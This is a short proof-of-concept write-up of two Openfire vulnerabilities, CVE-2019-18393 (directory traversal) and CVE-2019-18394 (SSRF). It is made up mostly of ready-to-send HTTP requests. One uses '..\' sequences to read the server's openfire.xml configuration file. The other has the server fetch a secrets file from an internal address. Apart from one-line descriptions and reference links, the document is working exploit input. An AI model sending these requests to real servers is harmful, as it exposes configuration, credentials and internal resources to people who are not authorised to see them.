# CVE-2019-18393 Directory Traversal

## Description

PluginServlet.java in Ignite Realtime Openfire through 4.4.2 does not ensure that retrieved files are located under the Openfire home directory,
aka a directory traversal vulnerability.

## POC

```
GET /plugins/search/..\..\..\conf\openfire.xml HTTP/1.1
Host: TARGET:9090
Cookie: JSESSIONID=node01aaib5x4g4p781q3i2m2tm74u91.node0;
```


# CVE-2019-18394 Unauthenticated SSRF

## Description

A Server Side Request Forgery (SSRF) vulnerability in FaviconServlet.java in Ignite Realtime Openfire through 4.4.2 
allows attackers to send arbitrary HTTP GET requests.

```
GET /getFavicon?host=192.168.176.1:8080/secrets.txt? HTTP/1.1
Host: TARGET:9090
```

## Reference

- https://swarm.ptsecurity.com/openfire-admin-console/
- https://twitter.com/ptswarm/status/1290660280372994054
